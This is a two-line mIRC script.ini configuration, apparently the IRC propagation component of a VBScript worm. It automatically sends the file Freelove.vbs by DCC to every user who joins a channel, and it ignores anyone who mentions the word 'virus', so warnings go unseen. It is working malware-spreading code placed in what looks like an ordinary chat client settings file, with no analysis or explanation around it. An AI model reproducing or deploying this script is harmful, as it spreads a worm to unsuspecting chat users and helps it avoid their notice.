[script]
n0=on 1:join:#:if ($nick == $me) halt | else dcc send $nick c:\Windows\Freelove.vbs
n1=on 1:text:*virus*:*:{ ignore $nick }
